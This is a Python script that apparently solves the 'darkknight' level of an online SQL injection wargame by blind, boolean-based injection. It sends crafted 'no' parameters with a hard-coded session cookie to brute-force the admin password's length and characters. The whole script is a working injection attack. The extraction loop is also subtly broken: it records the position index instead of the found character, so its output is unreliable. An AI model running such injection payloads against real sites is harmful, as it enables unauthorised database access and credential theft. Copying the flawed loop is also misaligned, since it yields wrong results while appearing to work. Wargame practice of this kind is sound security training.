import requests as req
import string

url = "https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php";

cookie = {
    "PHPSESSID":"di2u1taqi592d72bbno219gs9s"
}

r = req.get(url,cookies=cookie)

# Find the length of the password
def get_passlength():
    for i in range(1,10):
        res = req.get(url,params={"no":f"-1 or length(pw) like {i} --"},cookies=cookie);
        print(f"Sent request {res.url}")
        if "Hello admin" in res.text:
            print(f"The length of password is {i}");
            break;
# Got the length as 8


def get_pass():
    '''
    select id from prob where id='guest' and pw='' and no=-1 or MID(pw,1,1) like 'i' ;
    +-------+
    | id    |
    +-------+
    | admin |
    +-------+
    '''
    characters = [char for char in string.ascii_letters + string.digits]
    pass_arr = []
    for i in range(1,9):
        for j in characters:
            res = req.get(url,params={"no":f"-1 or MID(pw,{i},1) like {j}  --"},cookies=cookie);
            print(f"Sent request {res.url}")
            if "Hello admin" in res.text:
                pass_arr.append(i);
                print(f"Got a character {j}");
                break;
    print(pass_arr)

if __name__ == '__main__':
    get_passlength();
    get_pass();

# SQL is left to right associative